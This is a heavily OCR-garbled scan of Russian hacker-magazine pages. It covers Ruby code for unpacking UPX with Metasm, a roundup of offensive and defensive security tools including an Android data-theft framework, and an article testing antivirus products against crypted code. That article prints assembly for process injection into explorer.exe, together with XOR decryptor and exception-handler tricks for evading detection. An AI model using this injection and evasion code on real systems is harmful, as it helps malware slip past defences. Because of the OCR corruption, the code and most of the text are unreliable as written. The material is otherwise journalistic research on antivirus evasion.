чале его наличие в текущей папке. Итак, теперь есть возможность 
динамической генерации драйверов и манипуляции ими на уровне 
ядра, если, конечно, у нас есть все права для его запуска. 

ПОТРОШЕНИЕ ПАКЕРА 

Напоследок мы займемся распаковкой известного пакера ІІРХ. 

В задачу нашего скрипта будет входить загрузка упакованно- 
го исполняемого файла в память, поиск оригинальной точки 



078 



ХАКЕР 01 /168/2013 



Метаморфозы 



входа по дизассемблированному ІІРХ стабу в памяти, установка 
прерываний на ОЕР, ну и наконец, дамп распакованного образа 
на жесткий диск. 

сіеб бпсІ_оер(ре) 

# Дизассемблируем стаб образа ІІРХ для поиска 

# сгоББ-Бесбіоп ;)итр'ов для нахождения оригинальной точки 

# входа (ОЕР) 

Разіл = ре.Рі5а55етЫе_Ра5Т_сІеер ' епТгуроіпб ’ 

гебигп іб по* з'тр = РэБт.РесоРеР.йпР { |аРРг, Рі| 

# Проверяем каждый блок данных узлов графа 
пехб іб лоб Рі.Ыоск_ЬеаР? 

Ь = Рі.ЬІоск 

пехб іб Ь.бо_5иЬбипсгеб.бо_а.1еп§бІі != 0 ог ^ 
Ь.бо_погта1.бо_а.1епббЬ != 1 
■Со = Ь.бо_погта1.бг5б 

# Игнорируем прыжки в несуществующие адреса 

пехб іб поТ $ = Ра5т.§еТ_5есТіоп_аТ(То) 

# Игнорируем прыжки в данной секции 

пехб і-Р Ра5т.8еТ_БесТіоп_аТ(Рі.аРРге55) == 5 
Тгие 

} 



Теперь мы имеем нормальный ]итр [<адрес>, Рі], благодаря 
которому появляется возможность восстановить оригинальную 
точку входа: 

Ра5т.погша1і2е(;)тр[1] .Ыоск.бо_погта1.бг5б) 
епР 



В качестве прерывания будем ставить Ьагсіѵѵаге ЬгеакроіпТ 
на ОЕР: 

Ре-Р РеЬи§1оор 

# Функция РеЬи§1оор истинна, пока нет адреса точки входа 

@РЬ§.бмЬр(@оер, :х, 1, Тгие) { ЬгеакроіпТ_са11Ьаск } 
@РЬ§. гип__-Рогеѵег 
риТБ ’Ропе* 
епР 

РеТ ЬгеакроіпТ_са11Ьаск 

риТБ ' Ьгеакроіпб ИіТ !’ 

# Снимаем дамп процесса из памяти, создавая при этом 

# уникальный исполняемый РЕ -файл 

Ритр = ЬоаРеРРЕ .тетРитр @РЬ§.тетогу, ^ЬазеаРРг, @оер, 

(ЗіаТ 

# Загрузчик упаковщика ЦрХ распаковывает все данные 

# из секции помеченных для чтения (КеаР Опіу), сменив 

# маркер КО на КЫ (КеаР ІлІгіТе) в заголовке РЕ -файла 
Ритр.БесТіопБ.еасЬ { |б| Б.сбагасбегіБбісБ |= 

[ 'МЕМ_ЫКІТЕ ' ] } 

# Пишем распакованный образ на жесткий диск 

Ришр.епсоРе_й1е (Эсіитрбіе 



В конце создаем функцию загрузки и управления ходом рас- 
паковки упакованного файла. Функция іпіііаііге является иници- 
ализирующей функцией, в задачу которой входит: поиск точки 
входа по дизассемблированному стабу, переход по точке входа 
и прокрутка (трейс) инструкций до распаковки оригинального кода 
файла, снятие образа распакованного файла на жесткий диск. 

Ре-Е іпібіа1І2е(б1е, Ришрбіе, іаб_гѵа=пі1) 

(Эсіитрбіе = Ритрбіе || ’ирх-РитреР.ехе' 

@іаб = іаб_гѵа 

рибБ ’Рі5а55епіЫіп§ ІІРХ ІоаРег...' 

# Считываем данные запакованного файла 




ГЛѴІ7І 

• Подробная 
информация по 
динамической 
рекомпиляции: 

Ыі.Іу/ІІКдсіа: 

• АІотісОрега- 
(іоп (введение 
в атомарные 
операции): 

Іѵ/5Яі ѵ(И: 

•ЗіаіісВі- 
пагу Тгапвіабоп 
НОѴУТО: ЬіМу/ 
ЬупІ4д; 

• Цпіѵегвиу о* 
Оиеепзіапсі Ві- 
пагуТгап$Іа*ог: 
Ыиу/5В)ВУУу; 

• Реѵегзе 
Сотрііаііоп 
ТесЬпідие$: Ьіі 
ІуМодІЕ; 
•страница 
проекта Меіазт: 
теІаа т.сгО.огд: 

• гуманное 
сообщество 
ЯиЬу'стов: гиЬу- 
Іа пд.огд . 



Исследование структурной деобфускации 



ре = РЕ.РесоРе_б1е(б1е) 

# Ищем точку входа 
(Эоер = бпР_оер(ре) 

гаізе 'сапб бпР оер...’ іб поб (Эоер 
рибБ "оер боипР аб #{Ехрге55іоп[(Эоер]}" 
@Ьа5еаРРг = ре.орТбеаРег. іта§е_Ьа5е 
(Эіаб -= @Ьа5еаРРг іб (Эіаб > @ЬазеаРРг 

# Запускаем отладчик для установки хардварных 

# брейкпоинтов и трейса (функция РеЬи§1оор) 

# инструкций 

@РЬ§ = 05.сиггепб.сгеабе_ргосеББ(б1е) .РеЬи§§ег 
рибБ 'гиппіпе...' 

РеЬи§1оор 



Единственное, что остается выполнить для восстановления 
полноценной работоспособности, — это восстановить таблицу 
импорта распакованного файла, например утилитой ІтрРес. 
Упаковщик ІІРХ мы выбрали в качестве протектора не случайно. 

В приведенном примере выполняются практически все стан- 
дартные функции распаковки, которые могут использоваться 
и в других упаковщиках/крипторах. По сути, эти принципы распро- 
страняются на 95% существующих протекторов, которые как раз 
таки в большинстве своем черпали вдохновение именно из ІЛРХ. 
Вторым немаловажным моментом является мультиплатформен- 
ность этого упаковщика, сжатие поддерживается как для РЕ СОРР, 
так и для Е1_Р-форматов, а вместе с тем распространяются и ме- 
тоды распаковки на *піх-системы. Последние 5% существующих 
протекторов, которые немного отличаются методами упаковки 
данных, — это, наверное, виртуализаторы кода и крипторы с пер- 
мутирующим движком. Для первых существуют таблицы с опко- 
дами ѴМ-движков, для вторых можно использовать ѴМ нашего 
фреймворка. 

ПРОЧИЕ ВОЗМОЖНОСТИ 

Меіазт предоставляет среду для воплощения большого коли- 
чества идей, связанных не только со сферой инфобезопасности. 
Существует ряд нерешенных алгоритмических задач в теории 
компиляторов. Написанный на РиЬу, фреймворк предоставляет 
возможность решения этих самых задач не самым человечным 
и ООП-шным образом. Дерзай! □□ 



ХАКЕР 01 /168/2013 



079 






взлом 



Дмитрий «Оіді» Евдокимов, йідііаі Зесигііу (іѵѵіПег.сот/еѵОокітоѵсЫ 



Ши 



шпш 

Вся информация предо- 
ставлена исключительно 
в ознакомительных 
целях. Ни редакция, 
ни автор не несут от- 
ветственности за любой 
возможный вред, при- 
чиненный материалами 
данной статьи. 

СОФТ ДЛЯ ВЗЛОМА И АНАЛИЗА БЕЗОПАСНОСТИ 




К$ зЬ гип.зЬ 
Ыеісоже іо р2р а<*)! 

Ч-еі’з Ьгеак зоте зіиіі. 

На і 1 і пд іог рЬопе іо соппесі 
ИЬаі Оо уоч шапі іо сіо іосіас 

0) СЬеск ІТ гооі 

1) Зіеаі Орр гіаіа 

2) Зіеаі боодіе Оаіс 

3) Зіеаі Сатега РЬоІ 
Л) Зіеаі ѵІРбз > 2001. 
х) Ехіі 

Сітоозе шізеіу: 



Автор: 

КуІеОзЬогп 

(ЛИ: 

ЫіР5://ді1ііиЬ.сот/ 



Система: 

АпОгоігіМіпгіоѵѵз/ 

Ыпих 





Авторы: 

Арсений Реутов, 
Тимур Юнусов, 
Дмитрий Нагибин 

ш?і.: 

сіоѵѵпІоэсІ5,рі&еси- 




Система: 

Мпгіоѵѵз 



2 



РН0МЕ-2-РН0МЕ АОВ РКАМЕѴѴОВК 

Ни для кого не будет новостью, но большин- 
ство Апсігоісі-девайсов после того, как попада- 
ют в руки пользователей, проходят инициацию 
под названием рутование :). И еще при этом 
оставляют активированным АОВ (Апсігоісі 
йеЬид Вгісіде). Что хорошего в рутованном 
Апсігоісі-устройстве, знают все, а вот что плохо- 
го — мало кто... 

На деле выходит так, что если устройство 
рутовано, имеет активированный АйВ и вы 
на секунду отвлеклись, то вы проиграли 
вчистую. А делает это возможным и легко 
выполнимым такой проект, как фреймворк 
р2р-асІЬ. Он представляет собой набор скрип- 
тов для АйВ, портированных на Апсігоісі. Так 
что можно быстро с помощью Місго-ІІЗВ ОТО 
кабеля одним Апсігоісі-устройством подцепить- 
ся к другому и выполнить запрограммирован- 
ные действия. Из уже реализованных нагрузок 
можно выделить такие: 

• кража из/сіаІа/сІаІаЛ и/зсІсагсі/АпсІгоісІ/сІаІа/; 

• получение фоток с камеры; 

• кража боодіе АиіЬ токенов; 

• кража ѵѵра_зиррІісап1.сопІ и ключей; 

• установкалюбогоАРК. 

Также в наборе присутствует приложение 
Апіібиагсі для обхода КеубиагсІ. В общем, реа- 
лизовавшее іаскіпд вектор с этим фреймвор- 
ком стало проще простого. 



БРУТФОРСИМ РНР5Е55Ю 5ЕЕ0 

Программа РНР5Е55Ю Беесі Вгиіеіогсе созда- 
на для подбора сида по известной хеш-сумме 
Мй5 в формате 4, 5, 6 бит на символ. Также 
программа обладает функцией инверсии, 
необходимой для перевода полученной хеш- 
суммы в исходную Мйб-последовательность. 
Искомый БеесІ состоит из (СІіепІ ІР. Іітезіатр. 
тісгозесопсізі. рЬр_сотЬіпесі_Ісд()), где СІІепІ 
ІР известен, Іітезіатр известен (заголовок 
Оаіе в ответе веб-сервера), тісгозесопсізі — 
значение от 0 до 1 000 000, а рЬр_сотЬіпесІ_ 
ІсдП получается из двух сидов: 

51 = ііітезіатр ХОК (тісгозесопсізг << 11); 

52 = РЮ ХОК (тісгозесопсІзЗ << 11). 

Пример значения: 0.12345678. 

Чтобы получить РЮ, можно воспользовать- 
ся такой штукой в АрасЬе, как зегѵег-зіаіиз, 
которая показывает — помимо прочей инфор- 
мации — «пиды» процессов, обслуживающие 
запросы клиентов, что может очень приго- 
диться. Таким образом, брут Мй5 РНР5Е55Ю 
заключается в подборе тісгозесопсіз, дельт 
последующих замеров тісгозесопсіз, а также 
РЮ. Особенности программы: 

• создание распределенной сети 
на кластере; 

• вычислениесиспользованием 
технологии СІЮА. 



Автор: 

Маиго бепіііе, 
РаЬгігіо сГАтоге 

ШИ: 

сдйе.доодіе.сот/р/ 

ьписк 

Система: 

ѴѴіпсІоѵуз/ипих 



3 



Х55 БЕЗ ШЕЛУХИ 

Бписк — это автоматизированный инстру- 
мент, который может помочь в поиске Х55- 
уязвимостей в веб-приложениях. Инструмент 
базируется на проекте Беіепіит и поддержи- 
вает Ріге^ох, боодіе СЬготе и Іпіегпеі Ехріогег. 
Используемый подход основан на реакции 
проверяемого контекста на инъекцию в него 
пользовательских данных. При этом инстру- 
мент задействует специальный набор обфус- 
цированных атакующих векторов для обхода 
различных фильтров. Проверка наличия Х55 
идет прямо в реальном браузере, воспро- 
изводится поведение как атакующего, так 
и жертвы (все благодаря Беіепіит). На данный 
момент инструмент поддерживает несколько 
готовых ХББ-векторов (но ничто не мешает 
добавить свои): 

• МтІ_рауІоасІ5; 

• із_аІегІ; 

• игі_рауІоасІ5; 

• ехргеззіоп_аІегІ_рауІоасІ5. 

Заинтересовавшимся советую обратиться 
к техническому отчету Аиіотаііс апсі Сопіехі- 
Аѵѵаге Сгозз-Бііе Бсгірііпд РіІІег Еѵазіоп 
от авторов, описывающих методологию, 
оценку и реализацию своего инструмента. 
Также программа сопровождается подробным 
руководством, благодаря которому начать ис- 
пользовать инструмент очень просто. 




080 



ХАКЕР 01 /168/2013 





7 утилит для исследования безопасности 



БОЕВОЙ КОМПЛЕКС для РНЕ РОКМАТ ФАЗЗИНГА 



ТЬе СЕКТ Вазіс Риггіпд Ргатеѵѵогк (ВЕР) — 
это инструмент для поиска дефектов, свя- 
занных с неправильной обработкой файлов 
программами, работающими в І_іпих и Мае 
05 X. Для создания тест-кейсов использует- 
ся мутация. Все система выполнена в виде 
готовой виртуальной машины под Ыпих 
и в виде установочного файла под Мае. Про- 
ект имеет ряд особенностей, которые очень 
нужны, но которые редко встретишь в анало- 
гичных программах. На них и остановимся. 

Поддержка минимизации аварий — 
файл, приводящий к падению программы, 
постепенно обрезают до тех пор, пока 
не получат наименьший файл, приводящий 
к падению. А чем меньше файл, тем проще 
найти причину такого поведения програм- 
мы. Да и как показывает опыт, при такой 
минимизации порой можно найти и другие 



уникальные падения. При этом возможно 
дальнейшее изменение файла с целью 
понять, какой именно участок файла к нему 
приводит, — эдакий РоС-мейкер. При по- 
мощи СаІІдгіпб автоматически для каждого 
краша строится трасса вызовов, так что ис- 
кать и анализировать причину падения 
становится еще проще. 

Еще одна крутая фишка проекта — ин- 
струмент саІІБІт, который на основании всех 
трасс вызовов, приведших к падению, стро- 
ит диаграмму зависимостей их друг от друга. 
С помощью данного проекта были найдены 
уязвимости в таких продуктах, как АбоЬе 
Реасіег и РІазЬ РІауег, Рохіі Ееасіег, Арріе 
ОиіскТіте, Ргеѵіеѵл/; в Мае 0$ X: ХрсК, Рорріег, 
РРтред, ЭазРег, ѴА/ігезЬагк, ѴМѵѵаге ѴМпс 
ѵісіео собес, іЬе Іпбео ѵібео собес и многих 
других. 



ЭСС4ЬгО 

0СО4МО 

М04Ье0 

0СО46ГО 

•и 

00О4СІО 

А'ОДсГО 

0004с30 

• 4/4 

0О:* *4с5О 
:»■ 4с і 

0С*)4с7О 
Э004с80 
0004с» 
0С©4с«© 
0СО4 ѵЬО 
0004сс0 
0004«Х> 
0СС4с«О 
'і«:о4с>о 
ОСС4ФО 
0СО4ЛО 
Ги:04<120 
0СО4«13О 

тшу. 

0О04ЛО 



70 7Й 7678 7878 
7678 7678 7878 
7078 7978 7078 
7978 7678 7878 
7878 7370 7878 
7878 7378 7878 
3820 5010 С(Б? 
7-45 2(49 (->:і 
ТЭТ) 7і:< 4». э 
• 

ЕЛ* С5Се 742" 
ІХЬ 2)12 »2" 
5178 761* 4. К5 
7378 2(78 7878 
С1С*і 0378 ((« 
7878 7378 7878 
7878 7378 7878 
7878 7878 7878 
7878 7378 7878 
7878 7378 7878 
7878 7378 7878 
7878 7378 7878 
7978 7678 7878 
7878 7378 7878 
0378 7678 7833 
с 401 ЗГСО 0031 



ТВ 78 7В7В 7876 
7878 7678 7879 
7079 7978 7076 
7878 787е 7878 
7Г7П 7Я7В 7076 
7878 7878 7878 
(.*<( ЗсЗс 2(53 
€785 2(4с Уле 
(с 74 6572 2(44 
(974 73(0 8572 
7 0Г( 436* (<•>' 
ЬФ (22* 5789 
(%7 6Я74 ГОЛ 
7878 7878 
7878 7878 7878 
••Л. М ООП 
7878 7878 787Ѳ 
>878 7878 7873 
7878 7878 7878 
7878 7878 7831 
7878 7878 7878 
7878 7878 7878 
’878 7878 7879 
7878 7878 7878 
С122 0032 1101 
(501 3131 0131 



78 ТВ 7В7Р 
7878 7978 
7078 7878 
7878 7879 
7П7В 7676 
7878 :>335 
7*412 7479 
(774 6820 
4 ”ѵ4 4485 
43ь( 5870 
7153 7'С1 
(474 6820 
782( 7878 
7374 7285 
7878 7878 
7878 7879 
7878 7878 
7878 /878 
7878 7878 
7878 7678 
7878 7878 
7878 7676 
7878 7878 
11 

С311 ЗК* 
С 100 ОСО© 



шгхчкттгхктх 
ггч'гхгхт тпи» 
«хтѵтітпгя 
іхшюешшш 
«кпшуіоти 

Э.-ТГ.^/КТОе 
со>/Ь;Іі р е»Сспр 
опег.< 0"СоІсг'>» 

се 29 О К/ЬібОі 
1х«/Н*»дМ Ь/х* 
м/ихшм»!^* 

Вакх 

дл.*хлх.., 



шмхлші 

итші 

«діншххі 



мм* 



мм* 

мюсх 

.ш* 



Авторы: СЕРТ 

ІІЯЬ: ѵѵѵѵѵѵ.сег1.огд/ѵиІ5/сіІ5соѵегу/ЬН.ЫтІ 

Система: Ыпих / Мае 05 X 



_ 







Автор: 

Кугіакоз Есопотои 

цри 



сот /^уупіоасі 

Система: 

Мпсіоѵѵз 





Автор: 

Артур Геркис 

цри 

ьир 5: / /д іі Гбд Ь,с опп / 

ахЗЗОсі/рѵІ 

Система: 

Ыпих/Мас 05 X 





Автор: 

ОапіеІ РізІеІІі 

ши.: 

пиоге,с оп п /е х$ иі 1е , 

рѣр 

Система: 

Мп(І0ѴѴ5 




АНТИОТЛАДКА — ЭТО ПРОСТО 

Основную часть времени при разработке сво- 
его проекта разработчики уделяют функцио- 
налу и качеству кода, что, естественно, очень 
логично. Но это все может пойти в трубу, если 
кто-то сломает и выложит в открытый доступ 
крякнутую версию или, разреверсив, создаст 
и будет продавать полный аналог. Только круп- 
ные компании могут себе позволить хорошие 
протекторы или отдельных специалистов под 
конкретный тип задач — защиту собственного 
кода. Что делать всем остальным? 

Ответ: использовать А.Р.Р Рго]есІ, также 
известный как Апіі-Реѵегзіпд Ргатеѵѵогк. С по- 
мощью него можно добавить дополнительный 
слой защиты внутрь кода своего приложения 
и тем самым сразу усложнить исследование 
приложения. Проект реализован в виде библи- 
отеки и имеет следующий функционал: 

• обнаружение отладчика; 

• обнаружение ѴМ; 

• обнаружение БапбВох; 

• обнаружение Вгеакроіпі; 

• СЬескЗит-калькулятор; 

• техники Ап(іАисЬ. 

Крутых профессионалов это, конечно, не оста- 
новит, но новичков отсеет тут же. Стоит отме- 
тить, что проект распространяется с открытым 
исходным кодом и с очень хорошей документа- 
цией, в которой очень просто разобраться. 



ТРЕЙСИМ И ВИЗУАЛИЗИРУЕМ 
РАБОТУ РНР 

Аудит веб-приложений, особенно монстров 
а-ля МогбРгезз, — это трудоемкая задача, 
и без сопутствующих инструментов не обой- 
тись, иначе исследование тысяч строк кода 
не может быть полноценным или выполненным 
в разумные сроки. Для этого есть специальные 
утилиты, но спектр решаемых ими задач узок, 
они не разрабатываются больше или не пред- 
назначены конкретно для нашей цели — поис- 
ка уязвимостей. 

Восполняет пробел недавно вышедший 
инструмент— РѴТ или РНР ѴиІпегаЬіІіІу Тгасег. 
Это расширение для РНР для аудита веб- 
приложений. Состоит из модулей, выполняю- 
щих следующие задачи: 

• трассировка функций и визуализация по- 
тока выполнения приложения; 

• дамп опкодов; 

• дамп переменных; 

• поискдинамически выполняющихся строк 
типа еѵаіП и меток в аргументах функций. 

Для каждого модуля и расширения имеются 
дополнительные настройки. Расширение 
проверено в версиях РНР 5.2, 5.3. От поль- 
зователя все еще требуется ручная работа 
и мозговая активность, но инструмент суще- 
ственно облегчает поиск уязвимостей в веб- 
приложениях. 



РЕ-ФАЙЛЫ КАК НА ЛАДОНИ 

При решении сгаскте или при исследовании 
бинарного приложения правильно начинать 
работу с анализа заголовка исполняемого 
файла. Если не знать, что скрывает в себе РЕ- 
формат, то может показаться, что это не несет 
полезной информации при анализе прило- 
жения. На самом деле данный формат имеет 
много недокументированных или плохо доку- 
ментированных и непонятных полей. Но на по- 
мощь к нам идет не программа, а швейцарский 
ножик — СРР Ехріогег. Программа предна- 
значена для анализа РЕ32/64 исполняемых 
файлов с полной поддержкой архитектур х86, 
х64, Ііапіит. В СРР Ехріогег входят: 

• РЕ-иНЕХ-редакторы; 

• редактор ресурсов; 

• редактор импорта; 

• сигнатурный сканер; 

• конвертер адресов; 

• дизассемблер; 

• анализаторзависимостей 

• анализаторзависимостей иещемногочего 
полезного. 

Также это первый РЕ-редактор, который по- 
нимает внутренние структуры .МЕТ (например, 
манифесты). Программа поддерживает плагины 
и имеет скриптовый язык, который упрощает 
повседневные задачи. По играм с РЕ советую 
обратиться к проекту Согкаті ( із.асі/Рѵітѵа І. 



ХАКЕР 01 /168/2013 



081 






МАІ.ѴѴАРЕ 



Евгений Дроботун МгоЬоШпШхакер.ги) 



Криптором 
по антивирусу 



ТЕСТИРУЕМ АВЕРЫ 
НА ПРЕДМЕТ 
ПРОТИВОСТОЯНИЯ 
ЗАШИФРОВАННОМУ 
ВРЕДОНОСНОМУ КОДУ 

С тех пор как мы впервые вдарили крипто- 
ром по самым популярным в нашем отечестве 
антивирусам, прошел год. Что же за этот год 
изменилось? Кто стал умнее, кто стал хитрее? 
Конечно же, только мы! (Спойлер: неожидан- 
ные результаты іпзісіе! — Евгений, на бумаге 
твой спойлер не пропечатается! — Прим, ред.) 



ПРЕДСТАВЛЯЕМ ИСПЫТУЕМЫХ 



Лица антивирусов, которые мы сегодня подвергнем испытанию, 
всем очень хорошо известны: 

• Антивирус Касперского 2012; 

• СотосіоІпІегпеі5есигіІуРго2012; 

• Ог.ѴѴеЬ 7.0; 

• АѵазіРгееАпІіѵігиз7.0; 

• М(Ю325таг15есип1у5; 

• Аѵіга РгееАпІіѵігиз; 

• МісгозоКБесигіІуЕззепІіаІз. 

Всего семь претендентов на звание лучшего труженика бес- 
крайних полей зашифрованного вредоносного кода. Итак, начнем... 



МЕТОДИКА ТЕСТИРОВАНИЯ 



В качестве приманки для антивирусов выступает программа, вне- 
дряющая код в процесс ехріогег.ехе (классика жанра, описанная во 
всех пособиях по написанию вредоносного кода, — поиск нужного 
процесса по имени окна, далее последовательность АРІ-функций: 
ѴИиаІАІІосЕх, М/гіІеРгосеззМетогу и СгеаІеРетоІеТЬгеасі). Внедрен- 
ный код выводит окошко, сигнализирующее об успешном внедрении. 

По идее, любое несанкционированное внедрение постороннего 
кода в процесс ехріогег.ехе (одно из самых любимых мест у различ- 
ного рода малвари) не должно обойтись без внимания антивирус- 
ных программ. 

Всего проведем восемь тестов, постепенно усложняя условия: 

• Тест 1. Исходная программа-приманка с прямым вызовом АРІ- 
функций, без каких-либо признаков шифрования. 

• Тест2. Неявный вызовАРІ-функцийсиспользованием 
ОеіРгосАсісІгезз, без шифрования кода и данных. 

• ТестЗ. Программа извтороготестасзашифрованнойсекцией 
данных. Алгоритм шифрования — ХОР с ключом ОРРЬ. Криптор 
начинает работу по точке входа. 

• Тест 4. Помимо шифрования секции данных, добавим шифро- 
вание секции кода. Принцип работы криптора оставляем без 
изменений. 

• Тест 5. Шифруем и код, и данные, все тем же алгоритмом. Крип- 
тор вызывается как саІІЬаск-функция из ТІ_5-таблицы. 

• Тест 6. Принцип шифрования оставляем без изменения, а 
криптор помещаем в 5ЕН -обработчик и вызываем с помощью 
исключения. 

• Тест 7. Шифруем и код, и данные. Алгоритм всетотжеХОП, но 
ключ достаем из большого антиэмуляционного цикла. 

• Тест 8. Шифрование секции кода и секции данных разными ал- 
горитмами, с разными ключами, при этом ключи вычисляются 
по итогам работы нескольких антиэмуляционных приемов. По- 
мимо этого, в секцию данных добавлены несколько фиктивных 
строк, которые не подвергаются шифрованию. 

Все тесты написаны на РАБМ'е, а необходимые преобразования 
скомпилированного кода (добавление Т1_5-таблицы, сохранение 
зашифрованного кода и данных) проделаны с использованием 
ОІІуйЬд. 



082 



ХАКЕР 01 /168/2013 








Криптором по антивирусу 




Результат работы нашего «вредоносного» кода 



Антивирусные программы устанавливались с параметрами 
и конфигурацией по умолчанию, при этом проверялась реакция 
антивируса при сканировании файла и реакция антивируса на по- 
пытку запуска нашего «вредоносного» кода. 



ТЕСТ 1 



Как мы уже говорили, в первом тесте нет никаких признаков шиф- 
рования, все действо происходит просто и прямолинейно. Вот он, 
исходник первого теста в полном виде: 

іпсіисіе ’міп32ах. іпс ' 

.сІаТа 

; Начало внедряемого кода 
Іп^есТСосІе: 

; Вычисляем дельта-смещение 
саіі Оеііа 

ОеІТа: 

рор езі 

зиЬ езі, йеііа 

; Готовим параметры вызова Мезза§еВохА с учетом дельта - 
; смещения 
ризП 0 

Іеаеах, [е5І+сар1:іоп] 
ризН еах 

Іеаеах, [езі+іехі] 
ризЬ еах 

ризіі 0 

са11[езі+р_Ме5заееВох] 

геТ4 

р_Мезза§еВохс1сІ ? 

ТехТсІЬ 'Произведено внедрение кода в ехріогег.ехе ' , 0 

сарТіопсІЬ ’Инжект кода', 0 

ЕпсІВДесШніе: 

; Конец внедряемого кода 

МатеЫіпсІомсІЬ 'рго§тап', 0 
РгосеззНапсІІе сісі ? 

Іп^есіАсІсІг 66 ? 

РгосеззІсІ сісі ? 

.сосіе 

; Размер внедряемого кода 

ІпіесіБіге = ЕпсИп^есІСосІе - ІпіесіСосІе 
з-Сагі: 

; Получаем указатель на Мезза^еВох 

тоѵ еах, [Мезза§еВох] 

тоѵ [р_МеззабеВох], еах 

;Ищем процесс ехріогег.ехе 

іпѵоке РіпсШпсІоиА, №теИіпсІоі\/, 0 

іпѵоке Се-СМіпсІомТНгеасіРгосеззІгі, еах, РгосеззІсІ 

іпѵоке ОрепРгосезз, РКОСЕ55_АИ_АССЕ55, 0, [РгосеззІсІ] 

тоѵ [РгосеззНапсІІе], еах 



;и внедряем в него код 

іпѵоке ѴігТиаІАПосЕх, еах, 0, ^есТБіге, 
МЕМ_С0ММІТ+МЕМ_ВЕ5ЕКѴЕ, 

РАСЕ_ЕХЕСІІТЕ_КЕАОМКІТЕ 
тоѵ [Іг^есТАсІсІг], еах 

іпѵоке ІлІгііеРгосеззМетогу, [РгосеззНапсІІе], [^есТАсІсІг] , 
ІпзесіСосІе,Іпзес15і2е, 0 

іпѵоке СгеаТеВетоТеТІігеасІ, [РгосеззНапсІІе], 0, 0, 

[Іг^есІАгісІг], 0, 0, 0 

іпѵоке СІозеНапсІІе, [РгосеззНапсІІе] 

іпѵокеЕхіІРгосезз, 0 

.епсІзТагТ 

Надеюсь, этот код понятен тебе без дополнительных пояснений и 
понятия дельта-смещения и базонезависимого кода (а именно таким 
и должен быть порядочный внедряемый код) никаких вопросов не вы- 
звали. Если это не так, то тебе прямая дорога на ѵѵазт.ги, там лежит 
достаточно много материала и про сам внедряемый код, и про инжект 
этого кода в процессы. Откомпилировав код, скармливаем его по 
очереди всем испытуемым, ожидая их дружной и бурной реакции. 

К сожалению, ожидания не оправдались: угрозу почуяли далеко 
не все антивирусы, а чуть более половины. Аѵазі с Аѵіг’ой почему-то 
промолчали при сканировании нашей приманки и беспрепятствен- 
но дали запустить код на выполнение. Сотосіо, в свойственной 
ему манере подымать шум по поводу любого шевеления в системе, 
отреагировал только при запуске этого файла, а по результатам 
сканирования заверил, что все в порядке. Остальные четверо 
написанную нами последовательность АРІ-функций оценили как 
вредоносную и определили наличие вреда в проверочном файле. 



ТЕСТ 2 



Слегка усложняем задачу для антивирусов. Делаем вызовы функ- 
ций через ОеіРгосАсІсігезз, а остальное оставляем без изменений. 
Отсутствие имен потенциально опасных функций в таблице импор- 
та не помешало лидерам первого теста удержать свои позиции, и 
картина осталась прежняя, что, в общем-то, и ожидалось. Настала 
пора уже что-нибудь закриптовать, поэтому идем дальше... 



ТЕСТ 3 



Берем исходник второго теста и добавляем в начало следующий код: 

; Расшифровка секции данных 
тоѵесх, епсісгуріагеа 
зиЬесх, Ье§іпсгуріагеа 
Іеа езі, [Ье§іпсгуріагеа] 
сіесгур*: 

тоѵ Ы, ЬуТе [езі] 

^Побайтная расшифровка 
;(ключ расшифровки 0-Р-РИ ) 
хог Ы, 0-Г-РЬ 
тоѵ ЬуТе [езі], Ы 
іпс езі 

Іоор сіесгурі: 

Как ты уже догадался, это и есть декриптор, который рас- 
шифровывает секцию данных. Самый простой вариант — алго- 



Антивирус Касперского 2012 


НЕІІР:Тго]ап.\Ѵіп32.Іпѵас1ег 


Эг. \ѴеЬ 7.0 


Тгоіап.ІпіесІ.огідіп 


М0032 5тагІ Бесигііуб 


РгоЬаЫу ипкпоѵуп ИеѵѵНеиг РЕ 


МісгозоК Зесигііу Еззепііаіз 


ТгоіапМіп32/АдепіВура55.деп!К 



Результаты проверки по первому тесту 



ХАКЕР 01 /168/2013 



083 






МАІЛѴАРЕ 



ритм побайтового ХОР'а с ключом ОРРЬ. Для правильной работы 
свежеоткомпилированный код сначала надо загрузить в ОІІуБЬд, 
полностью прогнать цикл декриптора (при этом секция данных у 
нас зашифруется) и сохранить уже зашифрованную секцию данных 
в тот же файл. В итоге мы скрыли от невооруженного взгляда име- 
на опасных АРІ из секции данных. Посмотрим, что сможетувидеть 
вооруженный различными эвристическими алгоритмами глаз 
антивирусов. 

Из гонки выбывает еще один претендент. Простейший вариант 
шифрования секции данных сбивает с толку сканер из состава 
Бг.МеЬ'а и заставляет его выдать отрицательный результат, а так- 
же промолчать при запуске этого кода. 



ТЕСТ 4 



В этот раз помимо секции данных мы подвергнем шифрованию и 
секцию кода. Все то же самое и без всяких изысков, тот же ХОР и 
тот же ключ ОРРЬ. Результаты этого теста совпадают с результата- 
ми предыдущего тестирования. «Касперский», N0032 и М5Е без 
труда разгадали наши коварные планы и опознали скрытую угрозу, 
а Сотого, хоть и пропустил код при сканировании, запустить его 
никаким образом не разрешил. 

Конечно, угроза была скрыта весьма посредственно, и было бы 
весьма печально, если бы такие примитивные плашка же. Надо 
придумать что-нибудь посложнее. 



ТЕСТЫ 5 И 6 



Если в предыдущих тестах декриптор запускался прямо с точки 
входа, то сейчас мы будем запускать его из других мест, а имен- 
но: как саІІЬаск-функцию из таблицы ТІ_5 (тест 5) и в виде 5ЕН- 
обработчика (тест 6), вызвав какое-нибудь исключение (например, 
попытавшись записать что-нибудь по адресу 400000Ы. 

Для пятого теста необходимо вручную создать ТІ_5-таблицу, 
загрузив файл в ОІІуБЬд, и записать начало этой таблицы в нужное 
место в РЕ-заголовке файла (это лучше сделать с помощью утили- 
ты СРРЕхрІогег или І_огс1РЕ, хотя, применив некоторую сноровку, 
это можно проделать и в ОІІуОЬд). ЛБ-таблицу можно писать в 
любое свободное место, и мы это сделаем в оставшемся до вырав- 
нивания границы пустом месте этой секции. 

Для правильной работы, как и в предыдущих случаях, сначала 
прогоним в отладчике все циклы в декрипторе, затем сохраним 
зашифрованный код и данные в том же файле. 

Для проведения шестого теста в начало кода добавим следующее: 

установка обработчика БЕН 

тоѵ еах, [-Рз:0] 



; Загружаем адрес декриптора в еах 

Іеаесх, [ЬесгурТог] 

асісіеах, 4 

тоѵ [еах], есх 

; Вызов исключения 

тоѵ [4000001л ] , еах 

Думаю, что из комментариев ясно, какие функции возложены 
на эти несколько строчек кода. Сначала мы устанавливаем свой 
обработчик исключений, который и является декриптором, а далее 
намеренно пытаемся записать что-нибудь в область памяти, в 
которую записывать ничего нельзя, и вызываем таким образом 
установленный нами декриптор. После компиляции этого теста 
также не забываем проделать все необходимые манипуляции в 
